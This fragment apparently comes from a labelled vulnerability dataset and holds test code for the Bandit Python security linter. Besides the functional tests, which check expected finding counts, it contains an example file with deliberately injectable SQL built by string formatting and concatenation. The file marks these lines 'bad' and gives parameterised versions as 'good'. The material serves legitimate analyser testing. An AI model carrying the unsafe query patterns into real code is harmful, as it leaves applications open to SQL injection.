6}}\n        self.check_example('sql_statements.py', expect)\n\n    def test_ssl_insecure_version(self):\n        '''Test for insecure SSL protocol versions.'''\n        expect = {\n            'SEVERITY': {'LOW': 1, 'MEDIUM': 10, 'HIGH': 7},\n            'CONFIDENCE': {'LOW': 0, 'MEDIUM': 11, 'HIGH': 7}\n        }\n        self.check_example('ssl-insecure-version.py', expect)\n\n    def test_subprocess_shell(self):\n        '''Test for `subprocess.Popen` with `shell=True`.'''\n        expect = {\n            'SEVERITY': {'HIGH': 3, 'MEDIUM': 1, 'LOW': 14},\n            'CONFIDENCE': {'HIGH': 17, 'LOW': 1}\n        }\n        self.check_example('subprocess_shell.py', expect)\n\n    def test_urlopen(self):\n        '''Test for dangerous URL opening.'''\n        expect = {'SEVERITY': {'MEDIUM': 14}, 'CONFIDENCE': {'HIGH': 14}}\n        self.check_example('urlopen.py', expect)\n\n    def test_utils_shell(self):\n        '''Test for `utils.execute*` with `shell=True`.'''\n        expect = {\n            'SEVERITY': {'LOW': 5},\n            'CONFIDENCE': {'HIGH': 5}\n        }\n        self.check_example('utils-shell.py', expect)\n\n    def test_wildcard_injection(self):\n        '''Test for wildcard injection in shell commands.'''\n        expect = {\n            'SEVERITY': {'HIGH': 4, 'MEDIUM': 0, 'LOW': 10},\n            'CONFIDENCE': {'MEDIUM': 5, 'HIGH': 9}\n        }\n        self.check_example('wildcard-injection.py', expect)\n\n    def test_yaml(self):\n        '''Test for `yaml.load`.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('yaml_load.py', expect)\n\n    def test_jinja2_templating(self):\n        '''Test jinja templating for potential XSS bugs.'''\n        expect = {\n            'SEVERITY': {'HIGH': 4},\n            'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}\n        }\n        self.check_example('jinja2_templating.py', expect)\n\n    def test_secret_config_option(self):\n        '''Test for `secret=True` in Oslo's config.'''\n        expect = {\n            'SEVERITY': {'LOW': 1, 'MEDIUM': 2},\n            'CONFIDENCE': {'MEDIUM': 3}\n        }\n        self.check_example('secret-config-option.py', expect)\n\n    def test_mako_templating(self):\n        '''Test Mako templates for XSS.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('mako_templating.py', expect)\n\n    def test_xml(self):\n        '''Test xml vulnerabilities.'''\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}\n        self.check_example('xml_etree_celementtree.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 2},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 2}}\n        self.check_example('xml_expatbuilder.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 3, 'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}}\n        self.check_example('xml_lxml.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},\n                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}\n        self.check_example('xml_pulldom.py', expect)\n\n        expect = {'SEVERITY': {'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('xml_xmlrpc.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}\n        self.check_example('xml_etree_elementtree.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 1}}\n        self.check_example('xml_expatreader.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},\n                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}\n        self.check_example('xml_minidom.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 6},\n                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 6}}\n        self.check_example('xml_sax.py', expect)\n\n    def test_httpoxy(self):\n        '''Test httpoxy vulnerability.'''\n        expect = {'SEVERITY': {'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('httpoxy_cgihandler.py', expect)\n        self.check_example('httpoxy_twisted_script.py', expect)\n        self.check_example('httpoxy_twisted_directory.py', expect)\n\n    def test_asserts(self):\n        '''Test catching the use of assert.'''\n        expect = {'SEVERITY': {'LOW': 1},\n                  'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('assert.py', expect)\n\n    def test_paramiko_injection(self):\n        '''Test paramiko command execution.'''\n        expect = {'SEVERITY': {'MEDIUM': 2},\n                  'CONFIDENCE': {'MEDIUM': 2}}\n        self.check_example('paramiko_injection.py', expect)\n\n    def test_partial_path(self):\n        '''Test process spawning with partial file paths.'''\n        expect = {'SEVERITY': {'LOW': 11},\n                  'CONFIDENCE': {'HIGH': 11}}\n\n        self.check_example('partial_path_process.py', expect)\n\n    def test_try_except_continue(self):\n        '''Test try, except, continue detection.'''\n        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']\n                    if x.__name__ == 'try_except_continue'))\n\n        test._config = {'check_typed_exception': True}\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('try_except_continue.py', expect)\n\n        test._config = {'check_typed_exception': False}\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('try_except_continue.py', expect)\n\n    def test_try_except_pass(self):\n        '''Test try, except pass detection.'''\n        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']\n                     if x.__name__ == 'try_except_pass'))\n\n        test._config = {'check_typed_exception': True}\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('try_except_pass.py', expect)\n\n        test._config = {'check_typed_exception': False}\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('try_except_pass.py', expect)\n\n    def test_metric_gathering(self):\n        expect = {\n            'nosec': 2, 'loc': 7,\n            'issues': {'CONFIDENCE': {'HIGH': 5}, 'SEVERITY': {'LOW': 5}}\n        }\n        self.check_metrics('skip.py', expect)\n        expect = {\n            'nosec': 0, 'loc': 4,\n            'issues': {'CONFIDENCE': {'HIGH': 2}, 'SEVERITY': {'LOW': 2}}\n        }\n        self.check_metrics('imports.py', expect)\n\n    def test_weak_cryptographic_key(self):\n        '''Test for weak key sizes.'''\n        expect = {\n            'SEVERITY': {'MEDIUM': 8, 'HIGH': 6},\n            'CONFIDENCE': {'HIGH': 14}\n        }\n        self.check_example('weak_cryptographic_key_sizes.py', expect)\n\n    def test_multiline_code(self):\n        '''Test issues in multiline statements return code as expected.'''\n        self.run_example('multiline_statement.py')\n        self.assertEqual(0, len(self.b_mgr.skipped))\n        self.assertEqual(1, len(self.b_mgr.files_list))\n        self.assertTrue(self.b_mgr.files_list[0].endswith(\n                        'multiline_statement.py'))\n\n        issues = self.b_mgr.get_issue_list()\n        self.assertEqual(2, len(issues))\n        self.assertTrue(\n            issues[0].fname.endswith('examples/multiline_statement.py')\n        )\n\n        self.assertEqual(1, issues[0].lineno)\n        self.assertEqual(list(range(1, 3)), issues[0].linerange)\n        self.assertIn('subprocess', issues[0].get_code())\n        self.assertEqual(5, issues[1].lineno)\n        self.assertEqual(list(range(3, 6 + 1)), issues[1].linerange)\n        self.assertIn('shell=True', issues[1].get_code())\n\n    def test_code_line_numbers(self):\n        self.run_example('binding.py')\n        issues = self.b_mgr.get_issue_list()\n\n        code_lines = issues[0].get_code().splitlines()\n        lineno = issues[0].lineno\n        self.assertEqual(\"%i \" % (lineno - 1), code_lines[0][:2])\n        self.assertEqual(\"%i \" % (lineno), code_lines[1][:2])\n        self.assertEqual(\"%i \" % (lineno + 1), code_lines[2][:2])\n\n    def test_flask_debug_true(self):\n        expect = {\n            'SEVERITY': {'HIGH': 1},\n            'CONFIDENCE': {'MEDIUM': 1}\n        }\n        self.check_example('flask_debug.py', expect)\n\n    def test_nosec(self):\n        expect = {\n            'SEVERITY': {},\n            'CONFIDENCE': {}\n        }\n        self.check_example('nosec.py', expect)\n\n    def test_baseline_filter(self):\n        issue_text = ('A Flask app appears to be run with debug=True, which '\n                      'exposes the Werkzeug debugger and allows the execution '\n                      'of arbitrary code.')\n        json = \"\"\"{\n          \"results\": [\n            {\n              \"code\": \"...\",\n              \"filename\": \"%s/examples/flask_debug.py\",\n              \"issue_confidence\": \"MEDIUM\",\n              \"issue_severity\": \"HIGH\",\n              \"issue_text\": \"%s\",\n              \"line_number\": 10,\n              \"line_range\": [\n                10\n              ],\n              \"test_name\": \"flask_debug_true\",\n              \"test_id\": \"B201\"\n            }\n          ]\n        }\n        \"\"\" % (os.getcwd(), issue_text)\n\n        self.b_mgr.populate_baseline(json)\n        self.run_example('flask_debug.py')\n        self.assertEqual(1, len(self.b_mgr.baseline))\n        self.assertEqual({}, self.b_mgr.get_issue_list())\n\n    def test_blacklist_input(self):\n        expect = {\n            'SEVERITY': {'HIGH': 1},\n            'CONFIDENCE': {'HIGH': 1}\n        }\n        self.check_example('input.py', expect)\n/n/n/n", "label": 0}, {"id": "6ce60806ca8a44d8a8b37050539e2b2f9a54b847", "code": "/examples/sql_statements.py/n/nimport sqlalchemy\n\n# bad\nquery = \"SELECT * FROM foo WHERE id = '%s'\" % identifier\nquery = \"INSERT INTO foo VALUES ('a', 'b', '%s')\" % value\nquery = \"DELETE FROM foo WHERE id = '%s'\" % identifier\nquery = \"UPDATE foo SET value = 'b' WHERE id = '%s'\" % identifier\nquery = \"\"\"WITH cte AS (SELECT x FROM foo)\nSELECT x FROM cte WHERE x = '%s'\"\"\" % identifier\n\n# bad\ncur.execute(\"SELECT * FROM foo WHERE id = '%s'\" % identifier)\ncur.execute(\"INSERT INTO foo VALUES ('a', 'b', '%s')\" % value)\ncur.execute(\"DELETE FROM foo WHERE id = '%s'\" % identifier)\ncur.execute(\"UPDATE foo SET value = 'b' WHERE id = '%s'\" % identifier)\n\n# good\ncur.execute(\"SELECT * FROM foo WHERE id = '%s'\", identifier)\ncur.execute(\"INSERT INTO foo VALUES ('a', 'b', '%s')\", value)\ncur.execute(\"DELETE FROM foo WHERE id = '%s'\", identifier)\ncur.execute(\"UPDATE foo SET value = 'b' WHERE id = '%s'\", identifier)\n\n# bad\nquery = \"SELECT \" + val + \" FROM \" + val +\" WHERE id = \" + val\n\n# bad\ncur.execute(\"SELECT \" + val + \" FROM \" + val +\" WHERE id = \" + val)\n\n\n# bug: https://bugs.launchpad.net/bandit/+bug/1479625\ndef a():\n    def b():\n        pass\n    return b\n\na()(\"SELECT %s FROM foo\" % val)\n\n# real world false positives\nchoices=[('server_list', _(\"Select from active instances\"))]\nprint(\"delete from the cache as the first argument\")\n/n/n/n/tests/functional/test_functional.py/n/n# -*- coding:utf-8 -*-\n#\n# Copyright 2014 Hewlett-Packard Development Company, L.P.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\nimport os\n\nimport six\nimport testtools\n\nfrom bandit.core import config as b_config\nfrom bandit.core import constants as C\nfrom bandit.core import manager as b_manager\nfrom bandit.core import metrics\nfrom bandit.core import test_set as b_test_set\n\n\nclass FunctionalTests(testtools.TestCase):\n\n    '''Functional tests for bandit test plugins.\n\n    This set of tests runs bandit against each example file in turn\n    and records the score returned. This is compared to a known good value.\n    When new tests are added to an example the expected result should be\n    adjusted to match.\n    '''\n\n    def setUp(self):\n        super(FunctionalTests, self).setUp()\n        # NOTE(tkelsey): bandit is very sensitive to paths, so stitch\n        # them up here for the testing environment.\n        #\n        path = os.path.join(os.getcwd(), 'bandit', 'plugins')\n        b_conf = b_config.BanditConfig()\n        self.b_mgr = b_manager.BanditManager(b_conf, 'file')\n        self.b_mgr.b_conf._settings['plugins_dir'] = path\n        self.b_mgr.b_ts = b_test_set.BanditTestSet(config=b_conf)\n\n    def run_example(self, example_script, ignore_nosec=False):\n        '''A helper method to run the specified test\n\n        This method runs the test, which populates the self.b_mgr.scores\n        value. Call this directly if you need to run a test, but do not\n        need to test the resulting scores against specified values.\n        :param example_script: Filename of an example script to test\n        '''\n        path = os.path.join(os.getcwd(), 'examples', example_script)\n        self.b_mgr.ignore_nosec = ignore_nosec\n        self.b_mgr.discover_files([path], True)\n        self.b_mgr.run_tests()\n\n    def check_example(self, example_script, expect, ignore_nosec=False):\n        '''A helper method to test the scores for example scripts.\n\n        :param example_script: Filename of an example script to test\n        :param expect: dict with expected counts of issue types\n        '''\n        # reset scores for subsequent calls to check_example\n        self.b_mgr.scores = []\n        self.run_example(example_script, ignore_nosec=ignore_nosec)\n        expected = 0\n        result = 0\n        for test_scores in self.b_mgr.scores:\n            for score_type in test_scores:\n                self.assertIn(score_type, expect)\n                for rating in expect[score_type]:\n                    expected += (\n                        expect[score_type][rating] * C.RANKING_VALUES[rating]\n                    )\n                result += sum(test_scores[score_type])\n        self.assertEqual(expected, result)\n\n    def check_metrics(self, example_script, expect):\n        '''A helper method to test the metrics being returned.\n\n        :param example_script: Filename of an example script to test\n        :param expect: dict with expected values of metrics\n        '''\n        self.b_mgr.metrics = metrics.Metrics()\n        self.b_mgr.scores = []\n        self.run_example(example_script)\n\n        # test general metrics (excludes issue counts)\n        m = self.b_mgr.metrics.data\n        for k in expect:\n            if k != 'issues':\n                self.assertEqual(expect[k], m['_totals'][k])\n        # test issue counts\n        if 'issues' in expect:\n            for (criteria, default) in C.CRITERIA:\n                for rank in C.RANKING:\n                    label = '{0}.{1}'.format(criteria, rank)\n                    expected = 0\n                    if expect['issues'].get(criteria, None).get(rank, None):\n                        expected = expect['issues'][criteria][rank]\n                    self.assertEqual(expected, m['_totals'][label])\n\n    def test_binding(self):\n        '''Test the bind-to-0.0.0.0 example.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'MEDIUM': 1}}\n        self.check_example('binding.py', expect)\n\n    def test_crypto_md5(self):\n        '''Test the `hashlib.md5` example.'''\n        expect = {'SEVERITY': {'MEDIUM': 11},\n                  'CONFIDENCE': {'HIGH': 11}}\n        self.check_example('crypto-md5.py', expect)\n\n    def test_ciphers(self):\n        '''Test the `Crypto.Cipher` example.'''\n        expect = {'SEVERITY': {'HIGH': 13},\n                  'CONFIDENCE': {'HIGH': 13}}\n        self.check_example('ciphers.py', expect)\n\n    def test_cipher_modes(self):\n        '''Test for insecure cipher modes.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('cipher-modes.py', expect)\n\n    def test_eval(self):\n        '''Test the `eval` example.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('eval.py', expect)\n\n    def test_mark_safe(self):\n        '''Test the `mark_safe` example.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('mark_safe.py', expect)\n\n    def test_exec(self):\n        '''Test the `exec` example.'''\n        filename = 'exec-{}.py'\n        if six.PY2:\n            filename = filename.format('py2')\n            expect = {'SEVERITY': {'MEDIUM': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        else:\n            filename = filename.format('py3')\n            expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example(filename, expect)\n\n    def test_exec_as_root(self):\n        '''Test for the `run_as_root=True` keyword argument.'''\n        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'MEDIUM': 5}}\n        self.check_example('exec-as-root.py', expect)\n\n    def test_hardcoded_passwords(self):\n        '''Test for hard-coded passwords.'''\n        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'MEDIUM': 7}}\n        self.check_example('hardcoded-passwords.py', expect)\n\n    def test_hardcoded_tmp(self):\n        '''Test for hard-coded /tmp, /var/tmp, /dev/shm.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'MEDIUM': 3}}\n        self.check_example('hardcoded-tmp.py', expect)\n\n    def test_httplib_https(self):\n        '''Test for `httplib.HTTPSConnection`.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('httplib_https.py', expect)\n\n    def test_imports_aliases(self):\n        '''Test the `import X as Y` syntax.'''\n        expect = {\n            'SEVERITY': {'LOW': 4, 'MEDIUM': 5, 'HIGH': 0},\n            'CONFIDENCE': {'HIGH': 9}\n        }\n        self.check_example('imports-aliases.py', expect)\n\n    def test_imports_from(self):\n        '''Test the `from X import Y` syntax.'''\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('imports-from.py', expect)\n\n    def test_imports_function(self):\n        '''Test the `__import__` function.'''\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('imports-function.py', expect)\n\n    def test_telnet_usage(self):\n        '''Test for `import telnetlib` and Telnet.* calls.'''\n        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('telnetlib.py', expect)\n\n    def test_ftp_usage(self):\n        '''Test for `import ftplib` and FTP.* calls.'''\n        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('ftplib.py', expect)\n\n    def test_imports(self):\n        '''Test for dangerous imports.'''\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('imports.py', expect)\n\n    def test_mktemp(self):\n        '''Test for `tempfile.mktemp`.'''\n        expect = {'SEVERITY': {'MEDIUM': 4}, 'CONFIDENCE': {'HIGH': 4}}\n        self.check_example('mktemp.py', expect)\n\n    def test_nonsense(self):\n        '''Test that a syntactically invalid module is skipped.'''\n        self.run_example('nonsense.py')\n        self.assertEqual(1, len(self.b_mgr.skipped))\n\n    def test_okay(self):\n        '''Test a vulnerability-free file.'''\n        expect = {'SEVERITY': {}, 'CONFIDENCE': {}}\n        self.check_example('okay.py', expect)\n\n    def test_os_chmod(self):\n        '''Test setting file permissions.'''\n        filename = 'os-chmod-{}.py'\n        if six.PY2:\n            filename = filename.format('py2')\n        else:\n            filename = filename.format('py3')\n        expect = {\n            'SEVERITY': {'MEDIUM': 2, 'HIGH': 8},\n            'CONFIDENCE': {'MEDIUM': 1, 'HIGH': 9}\n        }\n        self.check_example(filename, expect)\n\n    def test_os_exec(self):\n        '''Test for `os.exec*`.'''\n        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}\n        self.check_example('os-exec.py', expect)\n\n    def test_os_popen(self):\n        '''Test for `os.popen`.'''\n        expect = {'SEVERITY': {'LOW': 8, 'MEDIUM': 0, 'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 9}}\n        self.check_example('os-popen.py', expect)\n\n    def test_os_spawn(self):\n        '''Test for `os.spawn*`.'''\n        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}\n        self.check_example('os-spawn.py', expect)\n\n    def test_os_startfile(self):\n        '''Test for `os.startfile`.'''\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'MEDIUM': 3}}\n        self.check_example('os-startfile.py', expect)\n\n    def test_os_system(self):\n        '''Test for `os.system`.'''\n        expect = {'SEVERITY': {'LOW': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('os_system.py', expect)\n\n    def test_pickle(self):\n        '''Test for the `pickle` module.'''\n        expect = {\n            'SEVERITY': {'LOW': 2, 'MEDIUM': 6},\n            'CONFIDENCE': {'HIGH': 8}\n        }\n        self.check_example('pickle_deserialize.py', expect)\n\n    def test_popen_wrappers(self):\n        '''Test the `popen2` and `commands` modules.'''\n        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}\n        self.check_example('popen_wrappers.py', expect)\n\n    def test_random_module(self):\n        '''Test for the `random` module.'''\n        expect = {'SEVERITY': {'LOW': 6}, 'CONFIDENCE': {'HIGH': 6}}\n        self.check_example('random_module.py', expect)\n\n    def test_requests_ssl_verify_disabled(self):\n        '''Test for the `requests` library skipping verification.'''\n        expect = {'SEVERITY': {'HIGH': 7}, 'CONFIDENCE': {'HIGH': 7}}\n        self.check_example('requests-ssl-verify-disabled.py', expect)\n\n    def test_skip(self):\n        '''Test `#nosec` and `#noqa` comments.'''\n        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'HIGH': 5}}\n        self.check_example('skip.py', expect)\n\n    def test_ignore_skip(self):\n        '''Test --ignore-nosec flag.'''\n        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}\n        self.check_example('skip.py', expect, ignore_nosec=True)\n\n    def test_sql_statements(self):\n        '''Test for SQL injection through string building.'''\n        expect = {\n            'SEVERITY': {'MEDIUM': 12},\n            'CONFIDENCE': {'LOW': 7, 'MEDIUM': 5}}\n        self.check_example('sql_statements.py', expect)\n\n    def test_ssl_insecure_version(self):\n        '''Test for insecure SSL protocol versions.'''\n        expect = {\n            'SEVERITY': {'LOW': 1, 'MEDIUM': 10, 'HIGH': 7},\n            'CONFIDENCE': {'LOW': 0, 'MEDIUM': 11, 'HIGH': 7}\n        }\n        self.check_example('ssl-insecure-version.py', expect)\n\n    def test_subprocess_shell(self):\n        '''Test for `subprocess.Popen` with `shell=True`.'''\n        expect = {\n            'SEVERITY': {'HIGH': 3, 'MEDIUM': 1, 'LOW': 14},\n            'CONFIDENCE': {'HIGH': 17, 'LOW': 1}\n        }\n        self.check_example('subprocess_shell.py', expect)\n\n    def test_urlopen(self):\n        '''Test for dangerous URL opening.'''\n        expect = {'SEVERITY': {'MEDIUM': 14}, 'CONFIDENCE': {'HIGH': 14}}\n        self.check_example('urlopen.py', expect)\n\n    def test_utils_shell(self):\n        '''Test for `utils.execute*` with `shell=True`.'''\n        expect = {\n            'SEVERITY': {'LOW': 5},\n            'CONFIDENCE': {'HIGH': 5}\n        }\n        self.check_example('utils-shell.py', expect)\n\n    def test_wildcard_injection(self):\n        '''Test for wildcard injection in shell commands.'''\n        expect = {\n            'SEVERITY': {'HIGH': 4, 'MEDIUM': 0, 'LOW': 10},\n            'CONFIDENCE': {'MEDIUM': 5, 'HIGH': 9}\n        }\n        self.check_example('wildcard-injection.py', expect)\n\n    def test_yaml(self):\n        '''Test for `yaml.load`.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('yaml_load.py', expect)\n\n    def test_jinja2_templating(self):\n        '''Test jinja templating for potential XSS bugs.'''\n        expect = {\n            'SEVERITY': {'HIGH': 4},\n            'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}\n        }\n        self.check_example('jinja2_templating.py', expect)\n\n    def test_secret_config_option(self):\n        '''Test for `secret=True` in Oslo's config.'''\n        expect = {\n            'SEVERITY': {'LOW': 1, 'MEDIUM': 2},\n            'CONFIDENCE': {'MEDIUM': 3}\n        }\n        self.check_example('secret-config-option.py', expect)\n\n    def test_mako_templating(self):\n        '''Test Mako templates for XSS.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('mako_templating.py', expect)\n\n    def test_xml(self):\n        '''Test xml vulnerabilities.'''\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}\n        self.check_example('xml_etree_celementtree.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 2},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 2}}\n        self.check_example('xml_expatbuilder.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 3, 'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}}\n        self.check_example('xml_lxml.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},\n                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}\n        self.check_example('xml_pulldom.py', expect)\n\n        expect = {'SEVERITY': {'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('xml_xmlrpc.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}\n        self.check_example('xml_etree_elementtree.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 1}}\n        self.check_example('xml_expatreader.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},\n                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}\n        self.check_example('xml_minidom.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 6},\n                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 6}}\n        self.check_example('xml_sax.py', expect)\n\n    def test_httpoxy(self):\n        '''Test httpoxy vulnerability.'''\n        expect = {'SEVERITY': {'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('httpoxy_cgihandler.py', expect)\n        self.check_example('httpoxy_twisted_script.py', expect)\n        self.check_example('httpoxy_twisted_directory.py', expect)\n\n    def test_asserts(self):\n        '''Test catching the use of assert.'''\n        expect = {'SEVERITY': {'LOW': 1},\n                  'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('assert.py', expect)\n\n    def test_paramiko_injection(self):\n        '''Test paramiko command execution.'''\n        expect = {'SEVERITY': {'MEDIUM': 2},\n                  'CONFIDENCE': {'MEDIUM': 2}}\n        self.check_example('paramiko_injection.py', expect)\n\n    def test_partial_path(self):\n        '''Test process spawning with partial file paths.'''\n        expect = {'SEVERITY': {'LOW': 11},\n                  'CONFIDENCE': {'HIGH': 11}}\n\n        self.check_example('partial_path_process.py', expect)\n\n    def test_try_except_continue(self):\n        '''Test try, except, continue detection.'''\n        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']\n                    if x.__name__ == 'try_except_continue'))\n\n        test._config = {'check_typed_exception': True}\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('try_except_continue.py', expect)\n\n        test._config = {'check_typed_exception': False}\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('try_except_continue.py', expect)\n\n    def test_try_except_pass(self):\n        '''Test try, except pass detection.'''\n        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']\n                     if x.__name__ == 'try_except_pass'))\n\n        test._config = {'check_typed_exception': True}\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('try_except_pass.py', expect)\n\n        test._config = {'check_typed_exception': False}\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('try_except_pass.py', expect)\n\n    def test_metric_gathering(self):\n        expect = {\n            'nosec': 2, 'loc': 7,\n            'issues': {'CONFIDENCE': {'HIGH': 5}, 'SEVERITY': {'LOW': 5}}\n        }\n        self.check_metrics('skip.py', expect)\n        expect = {\n            'nosec': 0, 'loc': 4,\n            'issues': {'CONFIDENCE': {'HIGH': 2}, 'SEVERITY': {'LOW': 2}}\n        }\n        self.check_metrics('imports.py', expect)\n\n    def test_weak_cryptographic_key(self):\n        '''Test for weak key sizes.'''\n        expect = {\n            'SEVERITY': {'MEDIUM': 8, 'HIGH': 6},\n            'CONFIDENCE': {'HIGH': 14}\n        }\n        self.check_example('weak_cryptographic_key_sizes.py', expect)\n\n    def test_multiline_code(self):\n        '''Test issues in multiline statements return code as expected.'''\n        self.run_example('multiline_statement.py')\n        self.assertEqual(0, len(self.b_mgr.skipped))\n        self.assertEqual(1, len(self.b_mgr.files_list))\n        self.assertTrue(self.b_mgr.files_list[0].endswith(\n                        'multiline_statement.py'))\n\n        issues = self.b_mgr.get_issue_list()\n        self.assertEqual(2, len(issues))\n        self.assertTrue(\n            issues[0].fname.endswith('examples/multiline_statement.py')\n        )\n\n        self.assertEqual(1, issues[0].lineno)\n        self.assertEqual(list(range(1, 3)), issues[0].linerange)\n        self.assertIn('subprocess', issues[0].get_code())\n        self.assertEqual(5, issues[1].lineno)\n        self.assertEqual(list(range(3, 6 + 1)), issues[1].linerange)\n        self.assertIn('shell=True', issues[1].get_code())\n\n    def test_code_line_numbers(self):\n        self.run_example('binding.py')\n        issues = self.b_mgr.get_issue_list()\n\n        code_lines = issues[0].get_code().splitlines()\n        lineno = issues[0].lineno\n        self.assertEqual(\"%i \" % (lineno - 1), code_lines[0][:2])\n        self.assertEqual(\"%i \" % (lineno), code_lines[1][:2])\n        self.assertEqual(\"%i \" % (lineno + 1), code_lines[2][:2])\n\n    def test_flask_debug_true(self):\n        expect = {\n            'SEVERITY': {'HIGH': 1},\n            'CONFIDENCE': {'MEDIUM': 1}\n        }\n        self.check_example('flask_debug.py', expect)\n\n    def test_nosec(self):\n        expect = {\n            'SEVERITY': {},\n            'CONFIDENCE': {}\n        